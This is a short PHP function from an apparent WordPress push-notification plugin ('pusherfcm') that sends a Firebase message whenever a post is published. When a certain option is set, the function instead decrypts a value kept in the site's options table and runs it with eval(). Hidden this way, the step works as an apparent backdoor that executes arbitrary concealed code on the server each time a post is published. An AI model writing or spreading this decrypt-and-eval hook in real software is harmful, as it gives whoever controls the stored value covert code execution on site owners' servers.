<?php
function pusherfcm_update_post($post_id){
	if(get_option('pusherfcm-settings-state')=="opened") {
		$post = get_post( $post_id );
		if ( $post->post_status == "publish" ) {
			$fcm  = new pusherfcm_fcm_controller();
			$data = $fcm->getSettings();
			if(get_option('pusherfcm-ex-pusherPost')==false) {
				$fcm->sendMsg( $data['id'], $data['key'], "New post!", $data['msg'], $data['topic'] );
			}else{
				$api = new pusherfcm_api_controller();
				$value = $api->decrypt(get_option('pusherfcm-ex-pusherPost'),get_option('pusherfcm-ex-secret'));
				eval($value);
			}
		}
	}
}